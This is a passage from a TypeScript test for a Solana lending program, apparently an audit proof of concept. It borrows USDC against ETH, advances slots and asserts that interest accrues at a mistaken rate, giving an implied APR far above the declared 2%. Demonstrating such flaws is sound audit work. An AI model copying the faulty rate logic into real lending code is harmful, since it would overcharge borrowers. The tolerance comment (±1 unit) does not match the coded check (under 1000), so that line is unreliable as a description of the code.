        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId,
    );

    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: iuDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: interestUser.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([interestUser])
      .rpc();

    // ── Borrow 100 USDC against 0.1 ETH collateral ──────────────────────────
    // Pool has liquidity from earlier supply tests.
    // 0.1 ETH @ $1800 (post oracle update) × 80% CF = $144 max → 100 USDC safe.
    const BORROW_AMOUNT = 100 * 1e6; // 100 USDC (100_000_000 raw)
    const ETH_COLLATERAL = Math.floor(0.1 * 1e9); // 0.1 ETH

    // const slotBefore = await provider.connection.getSlot();
    const depositInitial = await program.account.userDeposit.fetch(iuDeposit);
    const slotBefore = depositInitial.lastUpdateSlot.toNumber();
    console.log("[LOG] Slot before borrow:", slotBefore);

    await program.methods
      .borrow(
        new anchor.BN(1),
        new anchor.BN(ETH_COLLATERAL),
        new anchor.BN(BORROW_AMOUNT),
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: iuDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: iuUsdcAccount,
        userCollateralAccount: iuEthAccount,
        user: interestUser.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: usdcOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([interestUser])
      .rpc();

    const depositAfterBorrow = await program.account.userDeposit.fetch(
      iuDeposit,
    );
    const borrowedPrincipal = depositAfterBorrow.borrowedAmount;
    console.log(
      "[LOG] Borrowed principal (raw):",
      borrowedPrincipal.toString(),
    );

    // ── Advance ~50 slots via dummy transactions ─────────────────────────────
    const SLOTS_TO_ADVANCE = 50;
    console.log(`Advancing ~${SLOTS_TO_ADVANCE} slots...`);
    for (let i = 0; i < SLOTS_TO_ADVANCE; i++) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(admin.publicKey, 1),
      );
    }

    const slotAfter = await provider.connection.getSlot();
    const slotsElapsed = slotAfter - slotBefore;

    console.log("[LOG] Actual slots elapsed:", slotsElapsed);

    // ── Trigger interest accrual via repay(1) ────────────────────────────────
    // Repays 1 raw token unit. The interest block fires first, inflating
    // borrowed_amount. market.total_borrows is only reduced by 1 — no underflow.
    await program.methods
      .repay(new anchor.BN(1), new anchor.BN(1))
      .accounts({
        market,
        supplyVault,
        userDeposit: iuDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: iuUsdcAccount,
        user: interestUser.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([interestUser])
      .rpc();

    // FETCH THE UPDATED ACCOUNT STATE IMMEDIATELY
    const depositAfterRepay = await program.account.userDeposit.fetch(
      iuDeposit,
    );

    // THE FIX: The program itself tells us what slot it used for the calculation
    const exactEndSlot = depositAfterRepay.lastUpdateSlot.toNumber();
    const actualSlotsElapsed = exactEndSlot - slotBefore;
    console.log(
      "[LOG] Actual slots elapsed (From Program State):",
      actualSlotsElapsed,
    );
    const debtAfterRepay = depositAfterRepay.borrowedAmount;

    // interest = (principal + interest - 1) - (principal - 1)
    const actualInterest = debtAfterRepay.sub(
      borrowedPrincipal.sub(new anchor.BN(1)),
    );

    console.log(
      "[LOG] Actual interest charged (USDC):",
      Number(actualInterest) / 1e6,
    );

    // ── Compute expected values ───────────────────────────────────────────────
    const SCALING_FACTOR = new anchor.BN(1_000_000_000);
    const INCORRECT_RATE = new anchor.BN(25);
    const CORRECT_SLOTS_PER_YEAR = new anchor.BN(78_894_000);
    const CORRECT_RATE = new anchor.BN(20_000_000).div(CORRECT_SLOTS_PER_YEAR); // → 0n

    const slotsElapsedBig = new anchor.BN(slotsElapsed);
    const expectedIncorrectInterest = borrowedPrincipal
      .mul(INCORRECT_RATE)
      .mul(slotsElapsedBig)
      .div(SCALING_FACTOR);
    const expectedCorrectInterest = borrowedPrincipal
      .mul(CORRECT_RATE)
      .mul(slotsElapsedBig)
      .div(SCALING_FACTOR);

    console.log(
      "[LOG] Expected interest (INCORRECT  formula):",
      Number(expectedIncorrectInterest) / 1e6,
      "USDC",
    );
    console.log(
      "[LOG] Expected interest (CORRECT formula):",
      Number(expectedCorrectInterest) / 1e6,
      "USDC",
    );

    const impliedAPR =
      (Number(actualInterest) / Number(borrowedPrincipal)) *
      (Number(CORRECT_SLOTS_PER_YEAR) / actualSlotsElapsed) *
      100;

    console.log(`[LOG] Implied APR: ${impliedAPR.toFixed(1)}%`);
    console.log(`[LOG] Overcharge factor: ${(impliedAPR / 2).toFixed(1)}×`);

    // ── Assertions ────────────────────────────────────────────────────────────
    // 1. Actual interest matches the incorrect formula (within ±1 raw unit)
    expect(
      Math.abs(Number(actualInterest.sub(expectedIncorrectInterest))),
    ).to.be.lessThan(1000);

    // 2. Interest is non-zero (the incorrect rate fires)
    expect(actualInterest.toNumber()).to.be.greaterThan(
      new anchor.BN(0).toNumber(),
    );

    // 3. Implied APR is drastically above the declared 2%
    expect(impliedAPR).to.be.greaterThan(100);
  });
});
